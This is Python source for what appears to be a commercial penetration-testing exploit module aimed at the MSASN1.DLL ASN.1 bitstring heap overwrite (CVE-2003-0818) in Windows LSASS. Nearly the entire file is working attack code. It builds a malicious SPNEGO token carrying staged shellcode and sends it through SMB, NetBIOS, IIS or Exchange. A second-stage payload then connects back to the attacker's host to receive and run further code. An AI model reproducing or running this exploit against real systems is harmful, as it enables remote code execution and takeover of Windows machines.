#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("../../libs")
sys.path.append("./libs")

import socket
import timeoutsocket
import struct
import time
import random
import base64

# CANVAS modules
from exploitutils import *
from tcpexploit import *
import addencoder
import win32shell
import canvasengine
import shellcodeGenerator

# GUI info
NAME="ASN.1 bitstring decoding exploit"
DESCRIPTION="MSASN1.DLL bitstring decoding heap overwrite"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "Not public, silently fixed alongside the eEye ASN.1 bug"
DOCUMENTATION["CVE Name"] = "CVE-2003-0818"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0818"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["References"] = "http://www.eeye.com/html/Research/Advisories/AD20040210-2.html"
DOCUMENTATION["Repeatability"] = "Single shot"

VERSION="0.2"

GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows" ] ]
PROPERTY['VERSION'] = [ "2000", "XP", "NT" ] 
PROPERTY['MSADV'] = "MS04-007"

NOTES="""
CANVAS port of Solar Eclipse's ASN.1 exploit

Be sure to use exitthread to keep LSASS.EXE running on the remote end
after you're done with your access. This implementation of the attack
currently works on: Windows 2000 SP2, SP3, SP4 and Windows XP SP0 and SP1

Basically anything that lets us get our exploit token to LSASS.EXE is
a viable attack path. ie: IIS, SMB, NETBIOS, MSRPC etc. etc. 

Current attack ingress paths include:
    - SMB
    - IIS
    - NETBIOS
    
Todo:
    - add MSRPC
    - finish testing Exchange ingress
      - some quirks on Win2kServer in the initial "safe" unlink and actuall opcode exec
    
Notes:
    - you *have* to call exitthread to leave the remote running
      however you will not be able to repeat the attack.
               
"""

CHANGELOG="""
"""

# GUI run exploit
runAnExploit_gtk2 = canvasengine.runAnExploit_gtk2
runExploit = canvasengine.runExploit

# service, port to use
targets = {
    0 : ["Autoversioning N/A", 0],
    1 : ["Exploit LSASS.EXE through SMB (use default, port: 445)", 445],
    2 : ["Exploit LSASS.EXE through IIS (use default, port: 80)", 80],
    3 : ["Exploit LSASS.EXE through IIS HTTPS (use default, port: 443)", 443],
    4 : ["Exploit LSASS.EXE through NETBIOS (use default, port: 139)", 139],
    5 : ["Exploit LSASS.EXE through EXCHANGE (use default, port: 25, unstable)", 25]
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.host = "vmware.local"
        self.port = 445
        self.version = 1
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.ssl = 0

        self.name=NAME
        return
    
    # SPNEGO routines
 
    # length of a string as ASN.1 BER encoded length octets followed by the string
    def asn1(self, string):
        strlen = len(string)
        if strlen < 0x7f:
            string = chr(strlen) + string
        elif strlen <= 0xffff:
            string = chr(0x82) + chr(strlen >> 8) + chr(strlen & 0xff) + string
        else:
            self.raiseError("len > 0xffff")
        return string
    
    # create BER encoded bit string
    def bits(self, string):
        string = "\x03" + self.asn1("\x00" + string)
        return string
                     
    # create BER encoded constructed bit string
    def constr(self, *args):
        string = ""
        for concat in args:
            string += concat
        string = "\x23" + self.asn1(string)
        return string
    
    # create BER encoded SPNEGO token
    def token(self, stage0, stage1):
        if not stage0 or not stage1:
            self.raiseError("Invalid parameters to SPNEGO token()")

        if len(stage0) > 1032:
            self.raiseError("stage0 shellcode longer than 1032 bytes")

        # !!! search tag used in finding stage1 opcode    
        tag = "\x90\x42\x90\x42\x90\x42\x90\x42"

        if (len(tag) + len(stage1)) > 1033:
            self.raiseError("stage1 shellcode longer than %d bytes"% (1033 - len(tag)))

        
        # safe values to write to 
        fw = struct.pack("<L", 0x00010ff8)
        # leave some flags intact i suppose?
        bk = "\xf8\x0f\x01"
        #bk = struct.pack("<L", 0x00010ff8) 
 
        # PebLock.. function ptr
        retloc = struct.pack("<L", 0x7ffdf020)
        
        bitstring = self.constr(
            self.bits("A"*1024),
            "\x03\x00",
            self.constr(
                self.bits(tag + stage1 + "B"*(1033-len(tag + stage1))),
                self.constr(
                    self.bits(fw + bk)
                    ),
                self.constr(
                    self.bits("CCCC" + retloc + stage0 + "C"*(1032 - len(stage0))),
                    self.constr(
                        self.bits("\xeb\x06\x90\x90\x90\x90\x90\x90"),
                        self.bits("D"*1040)
                        )
                    )
                )
            )
        
        """
        Application Constructed Object:
            SPNEGO OID
            NegTokenInit (0xa0)
            Constructed Sequence
            ContextFlags (0xa1)
        """
        token = "\x60" + self.asn1(              
            "\x06\x06\x2b\x06\x01\x05\x05\x02" + 
            "\xa0" + self.asn1(                
                "\x30" + self.asn1(
                    "\xa1" + self.asn1(
                        bitstring
                        )
                    )
                )
            )
        
        return token
    
    # IIS routines
    
    # we can upload and execute files 
    def exploitIIS(self, host, port, token):
        self.setProgress(50)
        s = self.connectToHost(host, port)
        
        encodedtoken = base64.encodestring(token)
        # chop off trailing newline
        if encodedtoken == None:
            self.raiseError("Problem with base64 encoding of token")

        # filter out all newlines
        cleantoken = ""
        for i in range(0, len(encodedtoken)):
            if encodedtoken[i] != '\n':
                cleantoken += encodedtoken[i]
        encodedtoken = cleantoken
        
        #print "%s"% encodedtoken
        
        request = ""
        request += "GET / HTTP/1.0\r\n"
        request += "Host: " + host + "\r\n"
        request += "Authorization: Negotiate " + encodedtoken + "\r\n\r\n"
        
        self.log("Evil IIS request is %d bytes"% len(request))
 
        self.websend(s, request)
        
        if self.ssl:
            self.log("HTTPS request sent")
        else:
            self.log("HTTP request sent")
        
        self.setProgress(75)
        
        # !!! when we start using our latch-on GOcode injection
        # !!! we collect here 
        
        response = self.webrecv(s)
        
        if response.count("0x80090301"):
            s.close()
            self.raiseError("Server does not support Negotiate authorization")
        if response.count("0x80090304"):
            self.log("Server responded with error code 0x80090304, hope it worked!\n")
        
        time.sleep(1)
        
        s.close()
        self.setProgress(100)
        return 1
    
    # SMB routines
    
    def smbHeader(self, data, command, flags2, tid, pid, uid):
        pkt = ""
        pkt += "\xff\x53\x4d\x42" # smb server component
        pkt += command # SMB Command
        pkt += "\x00\x00\x00\x00" # NT Status: Success
        pkt += "\x18" # flags (pathnames are case-insensitive)
        pkt += flags2 
        pkt += "\x00"*12 # reserved
        pkt += tid # tree ID
        pkt += pid # process ID
        pkt += uid # user ID
        pkt += "\x00\x00" # multiplex ID
        #tree connect andx request
        pkt = pkt + data
        return pkt

    def smbNegotiate(self, pid):
        data = ""
        pkt = ""
        dialects = ""
        
        NEGOTIATE = "\x72"
        
        data += "\x00" # word count

        for dialect in ["PC NETWORK PROGRAM 1.0","MICROSOFT NETWORKS 1.03",
                        "MICROSOFT NETWORKS 3.0","LANMAN1.0","LM1.2X002",
                        "Samba", "NT LANMAN 1.0", "NT LM 0.12"]:
            dialects += "\x02" + dialect + "\x00"

        bytecount = len(dialects)
        
        data += struct.pack("<H", bytecount)
        data += dialects

        # flags2 (support Unicode, NT error codes, long filenames,
        # extended security negotiation and extended attributes)

        # slap a smb header on our data
        pkt = self.smbHeader(data, NEGOTIATE, "\x53\xc8", "\x00\x00", struct.pack("<H", pid), "\x00\x00")
        # len wrap the packet
        pkt = self.netbiosSessionHeader(pkt)
        return pkt
    
    def smbSetupReqAndx(self, token, pid):
        data = ""
        pkt = ""
        
        SETUPANDX = "\x73"
        
        data += "\x0c" # word count
        data += "\xff" # AndX command, no further commands
        data += "\x00" # reserved
        data += "\x00\x00" # AndX offset
        data += "\x04\x11" # max buffer: 4356
        data += "\x0a\x00" # max mpx count: 10
        data += "\x00\x00" # VC number
        data += "\x00\x00\x00\x00" # session key

        data += struct.pack("<H", len(token)) # security blob length
        data += "\x00\x00\x00\x00" # reserved
        
        data += "\xd4\x00\x00\x80" # capabilities        
        
        # SMB message data
        data += struct.pack("<H", len(token))
        data += token
        data += "\x00\x00\x00\x00\x00\x00"
        
        # flags2 (support Unicode, NT error codes, 
        # long filenames, extended security negotiation 
        # and extended attributes and security signatures)
        
        # slap a header on our data
        pkt = self.smbHeader(data, SETUPANDX, "\x07\xc8", "\x00\x00", struct.pack("<H", pid), "\x00\x00")
        # len wrap the packet
        pkt = self.netbiosSessionHeader(pkt)
        return pkt 
     
    # exploit LSASS.EXE through SMB
    def exploitSMB(self, host, port, token):
        s = self.connectToHost(host, port)
        
        pid = random.randrange(0xffff)
        
        pkt = self.smbNegotiate(pid)
        self.log("Sending SMB Negotiate request (%d bytes)"% len(pkt))
        self.websend(s, pkt)
        self.setProgress(50)
    
        time.sleep(1)
        
        pkt = self.smbSetupReqAndx(token, pid)
        self.log("Sending SMB SetupAndX request (%d bytes)"% len(pkt))
        self.websend(s, pkt)
        
        time.sleep(1)
        
        self.setProgress(100)
        s.close()
        return 1
    
    # NETBIOS routines
    
    def netbiosEncode(self, instr):
        result = ""
        for c in instr:
            a = ord(c) & 0x0f
            b = (ord(c) & 0xf0) >> 4
            result += chr(0x41 + b) + chr(0x41 + a)
        return result
    
    def netbiosSessionRequest(self, s):
        pkt=""
        data=""
      
        data += "\x20" #Server service
        serverstring = "*SMBSERVER"
        data += self.netbiosEncode(serverstring + " "*(16-len(serverstring)))
        data += "\x00" #nul terminate

        data += "\x20" #Server service
        serverstring = "WWW"
        data += self.netbiosEncode(serverstring + " "*(16-len(serverstring)))
        data += "\x00" #nul Terminate
        
        # netbios header 
        
        pkt += "\x81" #session request
        pkt += "\x00" #flags
        pkt += struct.pack(">H", len(data))
        pkt += data
        
        self.websend(s, pkt)
        
        data = s.recv(4)

        if data == "" or data[0] != "\x82":
            self.raiseError("Failed to negotiate a netbios session request")
        
        self.log("Successfully negotiated a netbios session")
        return 1
    
    def netbiosSessionHeader(self, data):
        pkt = ""
        pkt += "\x00" #type, session message
        pkt += "\x00" #flags, (we're not handling any > 0xffff packets here)
                      #so we should be ok not having a 0x10 flag option
        pkt += struct.pack(">H", len(data))
        pkt += data
        return pkt
    
    def exploitNETBIOS(self, host, port, token):
        s = self.connectToHost(host, port)

        self.netbiosSessionRequest(s)
        
        pid = random.randrange(0xffff)
        
        pkt = self.smbNegotiate(pid)
        
        self.log("Sending NETBIOS SMB Negotiate request (%d bytes)"% len(pkt))
        self.websend(s, pkt)
        self.setProgress(50)
    
        time.sleep(1)

        pkt = self.smbSetupReqAndx(token, pid)
        self.log("Sending NETBIOS SMB SetupAndX request (%d bytes)"% len(pkt))
        self.websend(s, pkt)
        
        time.sleep(1)
        
        self.setProgress(100)
        s.close()
        return 1
            
    # Exchange routines
    
    # exploit LSASS.EXE through Exchange
    def exploitEXCHANGE(self, host, port, token):
        s = self.connectToHost(host, port)
        
        encodedtoken = base64.encodestring(token)
        if encodedtoken == None:
            self.raiseError("Problem with base64 encoding of token")
        # filter out all newlines
        cleantoken = ""
        for i in range(0, len(encodedtoken)):
            if encodedtoken[i] != '\n':
                cleantoken += encodedtoken[i]
        encodedtoken = cleantoken
        
        self.log("Doing Exchange handshake")
        
        # flush banner
        response = self.webrecv(s)
        
        self.websend(s, "EHLO localhost\r\n")
        time.sleep(0.5)
        response = self.webrecv(s)

        self.setProgress(50)

        self.websend(s, "AUTH GSSAPI\r\n")
        time.sleep(0.5)
        response = self.webrecv(s)

        if not response.count("GSSAPI supported"):
            self.log("GSSAPI not supported")
            self.raiseError("GSSAPI AUTH not supported")
       
        self.log("GSSAPI AUTH supported")
            
        self.log("Sending SPNEGO token")
        self.websend(s, encodedtoken + "\r\n")
        
        self.log("Sleeping..")
        time.sleep(5)
        
        self.setProgress(100)
        s.close()
        return 1
    
    # CANVAS routines 
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        sc = shellcodeGenerator.win32()
        # we want to get a single clean instance
        sc.standalone = 1
        sc.addAttr("ASN1Stage0", None)
        self.shellcode = sc.get()
        # we need the localhost and localport in stage2
        # this is called from GUI with our localhost and port as args
        self.localhost = host
        self.localport = port
        self.log("Stage one payload is %d bytes"% len(self.shellcode))
        return self.shellcode
    
    def createStageTwoShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.log("Creating stage two payload")
        sc = shellcodeGenerator.win32()
        # using a custom findeip that keeps using current esp
        sc.foundeip = 1
        sc.addAttr("CreateThreadFindeip", None)
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        #sc.addAttr("initstackswap", None)
        sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF

        #sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("stackSwap", None)
        sc.addAttr("ExitThread",None)

        raw = sc.get()
        self.stagetwo = raw
        self.log("Stage two payload is %d bytes"% len(self.stagetwo))
        return self.stagetwo
   
    def connectToHost(self, t_host, t_port):
        s = self.gettcpsock()
        try:
            s.connect((t_host, t_port))
        except socket.error, msg:
            self.raiseError("Could not connect to %s:%d"% (self.host, self.port))
        return s
    
    def test(self):
        return 0
        
    def run(self):
        self.host=self.target.interface
        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        self.log("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))
        port = 0
        
        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0
        
        stage0 = self.shellcode
        self.log("connectback to: %s:%d"% (self.localhost, self.localport))
        stage1 = self.createStageTwoShellcode()
        
        self.log("Generating SPNEGO token")
        token = self.token(stage0, stage1)
        self.log("SPNEGO token is %d bytes long"% len(token))
        
        self.info, self.port = targets[self.version]

        #print self.host, self.port
        
        if self.info.count("SMB"):
            self.exploitSMB(self.host, self.port, token)
        elif self.info.count("NETBIOS"):
            self.exploitNETBIOS(self.host, self.port, token)
        elif self.info.count("IIS"):
            if self.info.count("HTTPS"):
                self.ssl = 1
            self.exploitIIS(self.host, self.port, token)
        elif self.info.count("EXCHANGE"):
            self.exploitEXCHANGE(self.host, self.port, token)
        else:
            self.debuglog("No suitable attack method found in version")
            return 0
            
        time.sleep(3)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
            self.log("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
            return 1
         
        self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
        self.log("%s attacking %s:%d - done"% (NAME, self.host, self.port))
        return 0

    def displayVersions(self):
        i = 0
        print "Available versions:"
        for listline in targets.values():
            print "\t%d : %s"% (i, listline[0])
            i = i + 1
    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
